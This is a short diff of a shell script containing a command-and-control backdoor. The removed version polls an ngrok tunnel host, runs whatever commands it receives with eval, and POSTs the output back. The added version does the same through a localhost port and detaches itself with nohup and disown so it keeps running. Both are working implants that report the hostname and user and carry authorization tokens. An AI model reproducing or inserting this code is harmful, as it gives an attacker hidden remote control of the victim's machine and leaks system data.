@@ -1,9 +1,2 @@
-# nohup $(
-s=ba47-62-19-254-230.ngrok-free.app && i=1f06d9-a329cb-83f9f6 && hname=$(hostname) && p=https://
-curl -s -k "$p$s/1f06d9/$hname/$USER" -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" -o /dev/null 2>/dev/null
-while :; do
-    c=$(curl -s -k "$p$s/a329cb" -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" 2>/dev/null)
-    if [ "$c" != None ]; then r=$(eval "$c") && if [ $r == byee ]; then pkill -P $$; else curl -s -k $p$s/83f9f6 -X POST -H "Authorization: $i" -H "ngrok-skip-browser-warning: 1" -d "$r" 2>/dev/null; fi; fi
-    sleep 0.8
-done
-# ) &
+nohup bash -c 's=127.0.0.1:13250&&i=971d21-746255-766429&&hname=$(hostname)&&p=http://;curl -s "$p$s/971d21/$hname/$USER" -H "Authorization: $i" -o /dev/null&&while :; do c=$(curl -s "$p$s/746255" -H "Authorization: $i")&&if [ "$c" != None ]; then r=$(eval "$c" 2>&1)&&echo $r;if [ $r == byee ]; then pkill -P $$; else curl -s $p$s/766429 -X POST -H "Authorization: $i" -d "$r";echo $$;fi; fi; sleep 0.8; done;' &
+disown
